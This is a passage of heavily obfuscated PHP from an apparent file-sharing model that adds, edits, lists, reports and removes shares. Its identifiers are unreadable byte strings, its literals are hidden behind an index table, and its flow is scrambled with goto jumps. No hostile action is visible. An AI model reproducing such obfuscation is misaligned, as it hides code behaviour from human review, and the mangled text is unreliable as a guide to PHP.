} $AÜïãåëÊ[$Dª†šğñ’§[1822]] = $aØê×‡¥Åì; return $AÜïãåëÊ; goto câˆ²Ëã»; Eº„ÇéØÓã: $CÊ§¶ÈÕñ = array($Dª†šğñ’§[466] => $AÜïãåëÊ[$Dª†šğñ’§[466]]); $aï¸õ‰ó©è = $Dª†šğñ’§[1821]; $aØê×‡¥Åì = Model($Dª†šğñ’§[563])->order($Dª†šğñ’§[392])->field($aï¸õ‰ó©è)->where($CÊ§¶ÈÕñ)->select(); goto AÏã™È„ĞÕ; câˆ²Ëã»: } protected function getInfoAuth($DğÜªÓñ‚) { $f²³‘â™ä¹ =& $_SERVER[¬ı§†‰ú˜¼]; $F®ò´ïâğ = $this->getInfo($DğÜªÓñ‚); $F®ò´ïâğ[$f²³‘â™ä¹[404]] = Model($f²³‘â™ä¹[480])->authMake($F®ò´ïâğ[$f²³‘â™ä¹[1822]]); return $F®ò´ïâğ; } protected function listData($e†¥„¥øÏÂ = null, $f¾Í‰¦‘Ì = 300) { $aƒÖóæ¦­ =& $_SERVER[¬ı§†‰ú˜¼]; $e‘š®ÔŠ× = array(array($aƒÖóæ¦­[471] => array($aƒÖóæ¦­[968], 0), $aƒÖóæ¦­[473] => array($aƒÖóæ¦­[968], 0), $aƒÖóæ¦­[1823] => $aƒÖóæ¦­[1777])); if ($e†¥„¥øÏÂ == $aƒÖóæ¦­[1824]) { $e‘š®ÔŠ× = array($aƒÖóæ¦­[471] => 1); } else { if ($e†¥„¥øÏÂ == $aƒÖóæ¦­[1055]) { $e‘š®ÔŠ× = array($aƒÖóæ¦­[473] => 1); } } $e‘š®ÔŠ×[$aƒÖóæ¦­[1527]] = USER_ID; $A¥İÂÇï¼ã = $this->where($e‘š®ÔŠ×)->selectPage($f¾Í‰¦‘Ì); return $A¥İÂÇï¼ã; } protected function listToMe($bŸê†ß„´ê = 300) { goto C«¥²ùîôŒ; c¡–ÚÌï…İ: $EĞ«‡éçœ = $this->field($eßİª³ğ·ˆ)->where($CÎÛ¨°ƒ•ë)->select(); foreach ($EĞ«‡éçœ as $eèØ¨´ÂÒã => &$Dƒ±ö­Á‡Û) { $Dƒ±ö­Á‡Û[$aŠ¹«áÓáù[1822]] = $dÓ´Ç–ÖÒá[$Dƒ±ö­Á‡Û[$aŠ¹«áÓáù[466]]]; } unset($Dƒ±ö­Á‡Û); goto EÇÚéçÙñ; EÇÚéçÙñ: $B‡ÚîœŠ‘ = array($aŠ¹«áÓáù[1827] => $EĞ«‡éçœ, $aŠ¹«áÓáù[1828] => $BŠÀîá¥Ò÷[$aŠ¹«áÓáù[363]]); return $B‡ÚîœŠ‘; goto eƒÊâ„ñ„ß; C«¥²ùîôŒ: $aŠ¹«áÓáù =& $_SERVER[¬ı§†‰ú˜¼]; $E±˜‚åÀ¨ = Model($aŠ¹«áÓáù[1825])->userGroupParents(USER_ID); $CÎÛ¨°ƒ•ë = array($aŠ¹«áÓáù[548] => SourceModel::TYPE_USER, $aŠ¹«áÓáù[482] => USER_ID); goto dÔÉ¼š›Ç¥; dÔÉ¼š›Ç¥: if ($E±˜‚åÀ¨) { $CÎÛ¨°ƒ•ë = array(array($aŠ¹«áÓáù[548] => SourceModel::TYPE_USER, $aŠ¹«áÓáù[482] => USER_ID), array($aŠ¹«áÓáù[548] => SourceModel::TYPE_GROUP, $aŠ¹«áÓáù[482] => array($aŠ¹«áÓáù[7], $E±˜‚åÀ¨)), $aŠ¹«áÓáù[1823] => $aŠ¹«áÓáù[1777]); } $BŠÀîá¥Ò÷ = Model($aŠ¹«áÓáù[563])->where($CÎÛ¨°ƒ•ë)->selectPage($bŸê†ß„´ê); $dÓ´Ç–ÖÒá = array_to_keyvalue_group($BŠÀîá¥Ò÷[$aŠ¹«áÓáù[366]], $aŠ¹«áÓáù[466]); goto fÒøÙ¦Ş; fÒøÙ¦Ş: if (!$dÓ´Ç–ÖÒá) { return $BŠÀîá¥Ò÷; } $eßİª³ğ·ˆ = $aŠ¹«áÓáù[1826]; $CÎÛ¨°ƒ•ë = array($aŠ¹«áÓáù[466] => array($aŠ¹«áÓáù[409], array_keys($dÓ´Ç–ÖÒá))); goto c¡–ÚÌï…İ; eƒÊâ„ñ„ß: } protected function shareAdd($F‘¢ƒİÁáÛ, $fÓÌ©Ôø£ã) { $a¢Ÿ½àë• =& $_SERVER[¬ı§†‰ú˜¼]; $Bì¤İŠêÄ™ = $this->_addShareData($F‘¢ƒİÁáÛ, $fÓÌ©Ôø£ã); if (!empty($fÓÌ©Ôø£ã[$a¢Ÿ½àë•[1829]])) { $this->_shareAuthSet($Bì¤İŠêÄ™, $fÓÌ©Ôø£ã[$a¢Ÿ½àë•[1829]]); } $this->shareEventAdd($F‘¢ƒİÁáÛ, $fÓÌ©Ôø£ã, $a¢Ÿ½àë•[1058]); return $Bì¤İŠêÄ™; } private function shareEventAdd($Cîøº¹Å„Á, $F©Îƒá˜Ô¼, $d«†ò…­Ã = "\x61\144\x64") { goto AŒøÏ˜Æãó; aÛÉ®å‹•ˆ: $AÚè’äœ³ö = $this->getInfoByPath($Cîøº¹Å„Á); $f­¸³ŸÕòˆ = $Bùôğ‹Œï[1832]; if ($AÚè’äœ³ö[$Bùôğ‹Œï[471]] == $Bùôğ‹Œï[495] && $F©Îƒá˜Ô¼[$Bùôğ‹Œï[471]] == $Bùôğ‹Œï[87]) { $f­¸³ŸÕòˆ = $Bùôğ‹Œï[1830]; } goto EÉìë…è´Ç; AŒøÏ˜Æãó: $Bùôğ‹Œï =& $_SERVER[¬ı§†‰ú˜¼]; if (!$Cîøº¹Å„Á || $Cîøº¹Å„Á == $Bùôğ‹Œï[495]) { return; } if ($d«†ò…­Ã == $Bùôğ‹Œï[1058]) { if ($F©Îƒá˜Ô¼[$Bùôğ‹Œï[471]] == $Bùôğ‹Œï[87]) { Model($Bùôğ‹Œï[532])->eventShare($Cîøº¹Å„Á, $Bùôğ‹Œï[1830]); } if ($F©Îƒá˜Ô¼[$Bùôğ‹Œï[473]] == $Bùôğ‹Œï[87]) { Model($Bùôğ‹Œï[532])->eventShare($Cîøº¹Å„Á, $Bùôğ‹Œï[1831]); } return; } goto aÛÉ®å‹•ˆ; EÉìë…è´Ç: if ($AÚè’äœ³ö[$Bùôğ‹Œï[471]] == $Bùôğ‹Œï[87] && $F©Îƒá˜Ô¼[$Bùôğ‹Œï[471]] == $Bùôğ‹Œï[495]) { $f­¸³ŸÕòˆ = $Bùôğ‹Œï[1833]; } if ($AÚè’äœ³ö[$Bùôğ‹Œï[473]] == $Bùôğ‹Œï[495] && $F©Îƒá˜Ô¼[$Bùôğ‹Œï[473]] == $Bùôğ‹Œï[87]) { $f­¸³ŸÕòˆ = $Bùôğ‹Œï[1831]; } if ($AÚè’äœ³ö[$Bùôğ‹Œï[473]] == $Bùôğ‹Œï[87] && $F©Îƒá˜Ô¼[$Bùôğ‹Œï[473]] == $Bùôğ‹Œï[495]) { $f­¸³ŸÕòˆ = $Bùôğ‹Œï[1834]; } goto D±È°¿¦ù˜; D±È°¿¦ù˜: Model($Bùôğ‹Œï[532])->eventShare($Cîøº¹Å„Á, $f­¸³ŸÕòˆ); return; goto dƒ„ó×†; dƒ„ó×†: } private function _addShareData($dÍÀ§·‘Ÿ, $Dè• â‚Ù‡ = array()) { goto E®· î™ê¤; eñŞµ™ÍíÕ: $a¬´ˆñªæÏ = $this->add($b¹¬ª¡é†™); $CÌßî÷ˆİ¹ = array($bï†–‘çª¬[468] => short_id($a¬´ˆñªæÏ)); $this->where(array($bï†–‘çª¬[465] => $a¬´ˆñªæÏ))->save($CÌßî÷ˆİ¹); goto aˆ¯¡±ï°; BĞ·æ°è§â: if ($då›³ø»Ò© = $this->where($dÒùš¤‘ˆç)->find()) { return $då›³ø»Ò©[$bï†–‘çª¬[466]]; } if ($dÍÀ§·‘Ÿ == 0) { $D¹ÎÉ³ÍĞ¸ = array($bï†–‘çª¬[28] => get_path_this($Dè• â‚Ù‡[$bï†–‘çª¬[76]])); } else { $D¹ÎÉ³ÍĞ¸ = Model($bï†–‘çª¬[798])->sourceInfo($dÍÀ§·‘Ÿ); if (!$D¹ÎÉ³ÍĞ¸) { return !1; } } if (!$Dè• â‚Ù‡[$bï†–‘çª¬[1431]]) { $Dè• â‚Ù‡[$bï†–‘çª¬[1431]] = $D¹ÎÉ³ÍĞ¸[$bï†–‘çª¬[28]]; } goto E»èìˆ÷±‚; aˆ¯¡±ï°: return $a¬´ˆñªæÏ; goto Fæçæ¼ğ±; E®· î™ê¤: $bï†–‘çª¬ =& $_SERVER[¬ı§†‰ú˜¼]; $dÒùš¤‘ˆç = array($bï†–‘çª¬[408] => $dÍÀ§·‘Ÿ, $bï†–‘çª¬[1519] => USER_ID); if ($dÍÀ§·‘Ÿ == 0) { $dÒùš¤‘ˆç = array($bï†–‘çª¬[1835] => $Dè• â‚Ù‡[$bï†–‘çª¬[1070]], $bï†–‘çª¬[1519] => USER_ID); } goto BĞ·æ°è§â; E»èìˆ÷±‚: $b¹¬ª¡é†™ = array($bï†–‘çª¬[1519] => USER_ID, $bï†–‘çª¬[408] => $dÍÀ§·‘Ÿ, $bï†–‘çª¬[1431] => $bï†–‘çª¬[33], $bï†–‘çª¬[471] => 0, $bï†–‘çª¬[473] => 0, $bï†–‘çª¬[1070] => $bï†–‘çª¬[33], $bï†–‘çª¬[304] => $bï†–‘çª¬[33], $bï†–‘çª¬[848] => $bï†–‘çª¬[33], $bï†–‘çª¬[1836] => 0, $bï†–‘çª¬[1837] => 0, $bï†–‘çª¬[474] => 0, $bï†–‘çª¬[475] => $bï†–‘çª¬[33], $bï†–‘çª¬[468] => $bï†–‘çª¬[33]); $cï¾‰ÚÂ = explode($bï†–‘çª¬[47], $bï†–‘çª¬[1838]); foreach ($cï¾‰ÚÂ as $aù­·™‚æ) { if (!isset($Dè• â‚Ù‡[$aù­·™‚æ])) { continue; } $b¹¬ª¡é†™[$aù­·™‚æ] = $Dè• â‚Ù‡[$aù­·™‚æ]; } goto eñŞµ™ÍíÕ; Fæçæ¼ğ±: } private function _shareAuthSet($D¡»íªÖéÙ, $C¶Ù“Ëç½…) { goto e©´Œ¢§×Î; D–Äœ§“§á: $c¬êÃä’İ->where(array($dâ‚½ÅÜä[466] => $D¡»íªÖéÙ))->delete(); $Eù„¾ÄˆÌ = array(); foreach ($C¶Ù“Ëç½… as $dñ¼¨Ì´øÏ) { $CíÏë½ÀÅ = SourceModel::TYPE_USER; if ($dñ¼¨Ì´øÏ[$dâ‚½ÅÜä[402]] == SourceModel::TYPE_GROUP) { $CíÏë½ÀÅ = SourceModel::TYPE_GROUP; } $a©è‘à§Óñ = array($dâ‚½ÅÜä[466] => $D¡»íªÖéÙ, $dâ‚½ÅÜä[402] => $CíÏë½ÀÅ, $dâ‚½ÅÜä[482] => intval($dñ¼¨Ì´øÏ[$dâ‚½ÅÜä[482]]), $dâ‚½ÅÜä[1785] => 0, $dâ‚½ÅÜä[1839] => -1); if ($dñ¼¨Ì´øÏ[$dâ‚½ÅÜä[1785]]) { $a©è‘à§Óñ[$dâ‚½ÅÜä[1785]] = $dñ¼¨Ì´øÏ[$dâ‚½ÅÜä[1785]]; } else { if ($dñ¼¨Ì´øÏ[$dâ‚½ÅÜä[1839]]) { $a©è‘à§Óñ[$dâ‚½ÅÜä[1839]] = $dñ¼¨Ì´øÏ[$dâ‚½ÅÜä[1839]]; } } $Eù„¾ÄˆÌ[] = $a©è‘à§Óñ; } goto fÀÄ•§Æô; fÀÄ•§Æô: return $c¬êÃä’İ->addAll($Eù„¾ÄˆÌ, array(), !0); goto f—Ó±À¿Ü; e©´Œ¢§×Î: $dâ‚½ÅÜä =& $_SERVER[¬ı§†‰ú˜¼]; if (!is_array($C¶Ù“Ëç½…)) { return !1; } $c¬êÃä’İ = Model($dâ‚½ÅÜä[1789]); goto D–Äœ§“§á; f—Ó±À¿Ü: } public function numViewAdd($B§Í¿Æ‡È) { $aØÂ¦ğá¬Ş =& $_SERVER[¬ı§†‰ú˜¼]; $FâÖŠ¸å”÷ = array($aØÂ¦ğá¬Ş[465] => $B§Í¿Æ‡È); $this->where($FâÖŠ¸å”÷)->setAdd($aØÂ¦ğá¬Ş[1836]); } public function numDownloadAdd($BÜ¦Íãê‘·) { $Cš«…ñÜÔ¥ =& $_SERVER[¬ı§†‰ú˜¼]; $d½„®’åÔ´ = array($Cš«…ñÜÔ¥[465] => $BÜ¦Íãê‘·); $this->where($d½„®’åÔ´)->setAdd($Cš«…ñÜÔ¥[1837]); } protected function shareEdit($B¡ĞÇÊ«ÄŠ, $fë«‘×‘ôí) { goto bÆÙ–ŸŠº¹; còÅìí: foreach ($aÖ·óØ¿á as $aš÷ß»«¨) { if (!array_key_exists($aš÷ß»«¨, $fë«‘×‘ôí)) { continue; } $DÉà™Èá ×[$aš÷ß»«¨] = $fë«‘×‘ôí[$aš÷ß»«¨]; } $this->shareEventAdd($CºĞŸ¤ó‹Ş[$c‹±„è¥¸¾[394]], $fë«‘×‘ôí, $c‹±„è¥¸¾[1657]); $this->where(array($c‹±„è¥¸¾[465] => $B¡ĞÇÊ«ÄŠ))->save($DÉà™Èá ×); goto dÖŠ¹ÄÜ‡Ë; bÆÙ–ŸŠº¹: $c‹±„è¥¸¾ =& $_SERVER[¬ı§†‰ú˜¼]; $CºĞŸ¤ó‹Ş = $this->getInfo($B¡ĞÇÊ«ÄŠ); if (!$CºĞŸ¤ó‹Ş) { return !1; } goto Eê§ˆ‹‡÷; Eê§ˆ‹‡÷: $this->_checkLinkShare($fë«‘×‘ôí, $CºĞŸ¤ó‹Ş); $DÉà™Èá × = array(); $aÖ·óØ¿á = explode($c‹±„è¥¸¾[47], $c‹±„è¥¸¾[1840]); goto còÅìí; dÖŠ¹ÄÜ‡Ë: if (isset($fë«‘×‘ôí[$c‹±„è¥¸¾[1829]])) { $this->_shareAuthSet($B¡ĞÇÊ«ÄŠ, $fë«‘×‘ôí[$c‹±„è¥¸¾[1829]]); } return !0; goto f†´È øì®; f†´È øì®: } private function _checkLinkShare($AŞ¹Šàºéä, $CËŠ½½†Óª) { goto Cá«ì’‘‰Ù; Cá«ì’‘‰Ù: $D¶Ã…©Ş¾ =& $_SERVER[¬ı§†‰ú˜¼]; if ($AŞ¹Šàºéä[$D¶Ã…©Ş¾[471]] != $D¶Ã…©Ş¾[87]) { return; } $A­„ØË¿Ò = $CËŠ½½†Óª[$D¶Ã…©Ş¾[85]][$D¶Ã…©Ş¾[394]]; goto D‚œÈ…µç“; D‚œÈ…µç“: if ($CËŠ½½†Óª[$D¶Ã…©Ş¾[85]][$D¶Ã…©Ş¾[29]] != $D¶Ã…©Ş¾[192]) { $F½Ë­Î±À… = $this->_folderReport($A­„ØË¿Ò); if (!$F½Ë­Î±À…) { return; } show_json(LNG($D¶Ã…©Ş¾[1841]) . $D¶Ã…©Ş¾[1842] . $F½Ë­Î±À…, !1); } $Fºò™‹”¸ = Model($D¶Ã…©Ş¾[798])->fileInfoGet($CËŠ½½†Óª[$D¶Ã…©Ş¾[85]][$D¶Ã…©Ş¾[394]]); if (!$Fºò™‹”¸) { return; } goto e¦šíôğœ; e¦šíôğœ: $eá½ÙÇ¡è = $this->shareFileMeta($Fºò™‹”¸[$D¶Ã…©Ş¾[445]]); if (isset($eá½ÙÇ¡è[$D¶Ã…©Ş¾[371]]) && $eá½ÙÇ¡è[$D¶Ã…©Ş¾[371]] == $D¶Ã…©Ş¾[87]) { show_json(LNG($D¶Ã…©Ş¾[1843]), !1); } goto a×¹ìÓ¿Ã; a×¹ìÓ¿Ã: } private function _folderReport($cÑõƒ¨¬‘Ô) { goto c¢ÈŠ·½¾î; B¢Şœô: $Fˆµóğ¼•à = array_to_keyvalue($dˆÉĞŠßÕ, $c‡ã¢­±…‹[33], $c‡ã¢­±…‹[28]); $Fˆµóğ¼•à[] = $aâ›¹–Ã[$c‡ã¢­±…‹[28]]; return implode($c‡ã¢­±…‹[8], $Fˆµóğ¼•à); goto F«Ú¾ó‡ÉÏ; f‘œ´¶©Ÿë: $DÇÇšïŞŒİ = array($c‡ã¢­±…‹[445] => array($c‡ã¢­±…‹[7], $BÕ×‡÷¤©‚), $c‡ã¢­±…‹[485] => array($c‡ã¢­±…‹[379], "\x25{$dĞêñ–Áå®}\x25"), $c‡ã¢­±…‹[421] => 0); $aâ›¹–Ã = Model($c‡ã¢­±…‹[798])->where($DÇÇšïŞŒİ)->field($c‡ã¢­±…‹[1845])->find(); if (!$aâ›¹–Ã) { return !1; } goto fĞÆùÒ³òœ; fĞÆùÒ³òœ: $Cöù…£ îË = substr($aâ›¹–Ã[$c‡ã¢­±…‹[485]], strpos($aâ›¹–Ã[$c‡ã¢­±…‹[485]], $dĞêñ–Áå®)); $DÇÇšïŞŒİ = array($c‡ã¢­±…‹[394] => array($c‡ã¢­±…‹[7], trim($Cöù…£ îË, $c‡ã¢­±…‹[47]))); $dˆÉĞŠßÕ = Model($c‡ã¢­±…‹[798])->where($DÇÇšïŞŒİ)->field($c‡ã¢­±…‹[28])->select(); goto B¢Şœô; aö¡œ¿Í®‚: if (!$BÕ×‡÷¤©‚) { return !1; } $BÕ×‡÷¤©‚ = array_to_keyvalue($BÕ×‡÷¤©‚, $c‡ã¢­±…‹[33], $c‡ã¢­±…‹[445]); $dĞêñ–Áå® = $c‡ã¢­±…‹[47] . $cÑõƒ¨¬‘Ô . $c‡ã¢­±…‹[47]; goto f‘œ´¶©Ÿë; c¢ÈŠ·½¾î: $c‡ã¢­±…‹ =& $_SERVER[¬ı§†‰ú˜¼]; $DÇÇšïŞŒİ = array($c‡ã¢­±…‹[445] => array($c‡ã¢­±…‹[968], 0), $c‡ã¢­±…‹[714] => 3); $BÕ×‡÷¤©‚ = Model($c‡ã¢­±…‹[1844])->where($DÇÇšïŞŒİ)->field($c‡ã¢­±…‹[445])->select(); goto aö¡œ¿Í®‚; F«Ú¾ó‡ÉÏ: } protected function remove($AĞğ’Â‘Éç) { goto a µ»®›õë; EƒÀô»Ô±¨: $CÀöÔ†¸© = $this->where($Bø½‰³ë±ø)->delete(); if ($CÀöÔ†¸©) { Model($dìí¸ìô«–[563])->where(array($dìí¸ìô«–[466] => $AĞğ’Â‘Éç))->delete(); } $A–¢¨§ÁÄŸ = is_array($AĞğ’Â‘Éç) ? $AĞğ’Â‘Éç[1] : array($AĞğ’Â‘Éç); goto BÖ•˜µäÅÕ; a µ»®›õë: $dìí¸ìô«– =& $_SERVER[¬ı§†‰ú˜¼]; if (is_array($AĞğ’Â‘Éç)) { $AĞğ’Â‘Éç = array($dìí¸ìô«–[7], $AĞğ’Â‘Éç); } $Bø½‰³ë±ø = array($dìí¸ìô«–[466] => $AĞğ’Â‘Éç); goto EƒÀô»Ô±¨; BÖ•˜µäÅÕ: for ($eì³ÀŒ·†Ø = 0; $eì³ÀŒ·†Ø < count($A–¢¨§ÁÄŸ); $eì³ÀŒ·†Ø++) { $e“É¯ø½Ü¤ = $this->getInfo($A–¢¨§ÁÄŸ[$eì³ÀŒ·†Ø]); if ($e“É¯ø½Ü¤[$dìí¸ìô«–[473]] == $dìí¸ìô«–[87]) { Model($dìí¸ìô«–[532])->eventShare($e“É¯ø½Ü¤[$dìí¸ìô«–[394]], $dìí¸ìô«–[1834]); } if ($e“É¯ø½Ü¤[$dìí¸ìô«–[471]] == $dìí¸ìô«–[87]) { Model($dìí¸ìô«–[532])->eventShare($e“É¯ø½Ü¤[$dìí¸ìô«–[394]], $dìí¸ìô«–[1833]); } } return $CÀöÔ†¸©; goto FŸâ÷§’‚ö; FŸâ÷§’‚ö: } protected function removeBySource($c¦Æ¡éŸä²) { goto a·°ßµ·Ë; a·°ßµ·Ë: $D£¹Ë‰‚é¹ =& $_SERVER[¬ı§†‰ú˜¼]; $cğÅŠ‹åÄ„ = array($D£¹Ë‰‚é¹[408] => array($D£¹Ë‰‚é¹[409], $c¦Æ¡éŸä²)); $d…êÆøÍ‡ = $this->field($D£¹Ë‰‚é¹[466])->where($cğÅŠ‹åÄ„)->select(); goto FÒ¥öºÃø–; CßÓê«‚Ç¿: $this->where($cğÅŠ‹åÄ„)->delete(); Model($D£¹Ë‰‚é¹[563])->where($cğÅŠ‹åÄ„)->delete(); goto CÆÌŞ ½İ¼; FÒ¥öºÃø–: $d…êÆøÍ‡ = array_to_keyvalue($d…êÆøÍ‡, $D£¹Ë‰‚é¹[33], $D£¹Ë‰‚é¹[466]); if (!$d…êÆøÍ‡) { return; } $cğÅŠ‹åÄ„ = array($D£¹Ë‰‚é¹[465] => array($D£¹Ë‰‚é¹[409], $d…êÆøÍ‡)); goto CßÓê«‚Ç¿; CÆÌŞ ½İ¼: } public function listAll($DŠ»õÒĞöö) { goto A‘‚¶ó¥Ë; bÁëîô¬³: $A¿Ÿ‡é‡ÖÁ = $this->_makeOrder()->where($cÙÛ×¯Ù)->selectPage(20); if (empty($A¿Ÿ‡é‡ÖÁ[$F‡«²„«—”[366]])) { return array(); } $this->_listDataApply($A¿Ÿ‡é‡ÖÁ[$F‡«²„«—”[366]]); goto cÉìâè•¡Œ; cÉìâè•¡Œ: return $A¿Ÿ‡é‡ÖÁ; goto EãÒ†®É„²; F½ŸÖ¹œõŸ: if ($DŠ»õÒĞöö[$F‡«²„«—”[722]]) { $AîòÈÚ÷¶ğ = $DŠ»õÒĞöö[$F‡«²„«—”[474]] ? $DŠ»õÒĞöö[$F‡«²„«—”[474]] : strtotime(date($F‡«²„«—”[1846])); $cÙÛ×¯Ù[$F‡«²„«—”[193]] = array($F‡«²„«—”[330], array($DŠ»õÒĞöö[$F‡«²„«—”[722]], $AîòÈÚ÷¶ğ)); } if ($DŠ»õÒĞöö[$F‡«²„«—”[29]]) { $cÙÛ×¯Ù[$DŠ»õÒĞöö[$F‡«²„«—”[29]]] = 1; } else { $cÙÛ×¯Ù[] = array($F‡«²„«—”[471] => array($F‡«²„«—”[968], 0), $F‡«²„«—”[473] => array($F‡«²„«—”[968], 0), $F‡«²„«—”[1823] => $F‡«²„«—”[1777]); } if ($DŠ»õÒĞöö[$F‡«²„«—”[1773]]) { $cÙÛ×¯Ù[] = array($F‡«²„«—”[468] => $DŠ»õÒĞöö[$F‡«²„«—”[1773]], $F‡«²„«—”[1431] => array($F‡«²„«—”[379], "\x25{$DŠ»õÒĞöö[$F‡«²„«—”[1773]]}\x25"), $F‡«²„«—”[1823] => $F‡«²„«—”[1777]); } goto bÁëîô¬³; A‘‚¶ó¥Ë: $F‡«²„«—” =& $_SERVER[¬ı§†‰ú˜¼]; $cÙÛ×¯Ù = array(); if ($DŠ»õÒĞöö[$F‡«²„«—”[1527]]) { $cÙÛ×¯Ù[$F‡«²„«—”[1527]] = $DŠ»õÒĞöö[$F‡«²„«—”[1527]]; } goto F½ŸÖ¹œõŸ; EãÒ†®É„²: } public function listDataApply($Aˆñ–Çá¦) { $this->_listDataApply($Aˆñ–Çá¦); return $Aˆñ–Çá¦; } private function _listDataApply(&$C£ÚÍŸ‘ÏÒ) { goto aÙÊ¦“™Ùß; dåµİå²Óí: $e’Á°Š©‡ò = array_to_keyvalue($C£ÚÍŸ‘ÏÒ, $cšßÓì„Û[33], $cšßÓì„Û[394]); $Aö†’©œë = Model($cšßÓì„Û[798])->sourceListInfo($e’Á°Š©‡ò, !0); foreach ($C£ÚÍŸ‘ÏÒ as $añÚ›”²® => &$dê …„’Ç‰) { $Fóëó“¨‚­ = $dê …„’Ç‰[$cšßÓì„Û[1527]]; $dê …„’Ç‰[$cšßÓì„Û[1847]] = $D‚›âà½Ô‚[$Fóëó“¨‚­] ? $D‚›âà½Ô‚[$Fóëó“¨‚­] : !1; $d›÷‰®ĞÓó = $dê …„’Ç‰[$cšßÓì„Û[394]]; $dê …„’Ç‰[$cšßÓì„Û[85]] = $Aö†’©œë[$d›÷‰®ĞÓó] ? $Aö†’©œë[$d›÷‰®ĞÓó] : !1; if ($dê …„’Ç‰[$cšßÓì„Û[85]][$cšßÓì„Û[421]] == $cšßÓì„Û[87]) { unset($C£ÚÍŸ‘ÏÒ[$añÚ›”²®]); } if ($dê …„’Ç‰[$cšßÓì„Û[85]] != $cšßÓì„Û[495] && !$dê …„’Ç‰[$cšßÓì„Û[85]]) { unset($C£ÚÍŸ‘ÏÒ[$añÚ›”²®]); } } goto aÆ¥¶ÆÙùä; aÙÊ¦“™Ùß: $cšßÓì„Û =& $_SERVER[¬ı§†‰ú˜¼]; $f…¼¸õë“Š = array_to_keyvalue($C£ÚÍŸ‘ÏÒ, $cšßÓì„Û[33], $cšßÓì„Û[1527]); $D‚›âà½Ô‚ = Model($cšßÓì„Û[505])->userListInfo(array_unique($f…¼¸õë“Š)); goto dåµİå²Óí; aÆ¥¶ÆÙùä: unset($dê …„’Ç‰); $C£ÚÍŸ‘ÏÒ = array_values($C£ÚÍŸ‘ÏÒ); goto C½ƒË¬‚Ä‹; C½ƒË¬‚Ä‹: } private function _makeOrder($Bñ½ÎÙ°Èí = '') { goto bŒ¬êÛÄ¡Ë; bŒ¬êÛÄ¡Ë: $CØ¼ÌóîˆÒ =& $_SERVER[¬ı§†‰ú˜¼]; $BÅ‡¤“ù = array($CØ¼ÌóîˆÒ[193], $CØ¼ÌóîˆÒ[474], $CØ¼ÌóîˆÒ[1836], $CØ¼ÌóîˆÒ[1837]); $c÷Š§åµµ = array($CØ¼ÌóîˆÒ[426] => $CØ¼ÌóîˆÒ[427], $CØ¼ÌóîˆÒ[428] => $CØ¼ÌóîˆÒ[429]); goto fŞêØí…·; EÙÛ«‚¯¨£: $Bñ½ÎÙ°Èí = $Bñ½ÎÙ°Èí . "{$eÈŒáŒŞ¡à}\40{$D£±“¤Í}"; return $this->order($Bñ½ÎÙ°Èí); goto F’Ãáƒ»¶â; fŞêØí…·: $eÈŒáŒŞ¡à = Input::get($CØ¼ÌóîˆÒ[433], $CØ¼ÌóîˆÒ[7], $CØ¼ÌóîˆÒ[414], $BÅ‡¤“ù); $D£±“¤Í = Input::get($CØ¼ÌóîˆÒ[434], $CØ¼ÌóîˆÒ[7], $CØ¼ÌóîˆÒ[1848], array($CØ¼ÌóîˆÒ[1772], $CØ¼ÌóîˆÒ[428])); $D£±“¤Í = $c÷Š§åµµ[$D£±“¤Í]; goto EÙÛ«‚¯¨£; F’Ãáƒ»¶â: } public function reportAdd($bé‹Ë‰®ó) { $a—ŞĞ‹ôÖ =& $_SERVER[¬ı§†‰ú˜¼]; $Cí›—áñ†î = array($a—ŞĞ‹ôÖ[466] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[466]], $a—ŞĞ‹ôÖ[1527] => USER_ID); if (Model($a—ŞĞ‹ôÖ[1844])->where($Cí›—áñ†î)->find()) { return !1; } $BÜ‰ª½¤«Æ = array($a—ŞĞ‹ôÖ[466] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[466]], $a—ŞĞ‹ôÖ[1431] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[1431]], $a—ŞĞ‹ôÖ[394] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[394]], $a—ŞĞ‹ôÖ[445] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[445]], $a—ŞĞ‹ôÖ[1527] => USER_ID, $a—ŞĞ‹ôÖ[29] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[29]], $a—ŞĞ‹ôÖ[429] => $bé‹Ë‰®ó[$a—ŞĞ‹ôÖ[429]]); return Model($a—ŞĞ‹ôÖ[1844])->add($BÜ‰ª½¤«Æ); } public function reportList($BñßÈ©‡ÅŸ) { goto càİğÁ‘±¢; C†‡Ş¯¥¦İ: $this->_listDataApply($f¾ÍÄ¾¨º[$EÈÑœŞçŠ‰[366]]); return $f¾ÍÄ¾¨º; goto e¼¤±İ«ÑÛ; càİğÁ‘±¢: $EÈÑœŞçŠ‰ =& $_SERVER[¬ı§†‰ú˜¼]; $bßøŠæ‹ò× = array(); if ($BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[722]]) { $A²Á‚æ†ß = $BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[474]] ? $BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[474]] : strtotime(date($EÈÑœŞçŠ‰[1846])); $bßøŠæ‹ò×[$EÈÑœŞçŠ‰[193]] = array($EÈÑœŞçŠ‰[330], array($BñßÈ©‡ÅŸ[$EÈÑœŞçŠ‰[722]], $A²Á‚æ†ß)); } goto bÈ©ËÚ­È; E‡Ì²ÒŞ¸: $Aª¨İôæ¿¼ = array($EÈÑœŞçŠ‰[426] => $EÈÑœŞçŠ‰[427], $EÈÑœŞçŠ‰[428] => $EÈÑœŞçŠ‰[429]); $b„¿ÃãÒçÊ = $EÈÑœŞçŠ‰[1853] . $Aª¨İôæ¿¼[$có’ ¶Ú¯]; $f¾ÍÄ¾¨º = Model($EÈÑœŞçŠ‰[1844])->where($bßøŠæ‹ò×)->order($b„¿ÃãÒçÊ)->selectPage(20); goto cÉñ è¦á‘; cÉñ è¦á‘: if (empty($f¾ÍÄ¾¨º[$EÈÑœŞçŠ‰[366]])) { return array(); } $bÎÖõ‹ê™Å = array_to_keyvalue_group($f¾ÍÄ¾¨º[$EÈÑœŞçŠ‰[366]], $EÈÑœŞçŠ‰[714], $EÈÑœŞçŠ‰[466]); if (!empty($bÎÖõ‹ê™Å[0])) { $BñßÈ©‡ÅŸ = $bÎÖõ‹ê™Å[0]; $bßøŠæ‹ò× = array($EÈÑœŞçŠ‰[466] => array($EÈÑœŞçŠ‰[7], $BñßÈ©‡ÅŸ)); $FÔš‹“»ºã = $this->where($bßøŠæ‹ò×)->field($EÈÑœŞçŠ‰[466])->select(); $FÔš‹“»ºã = 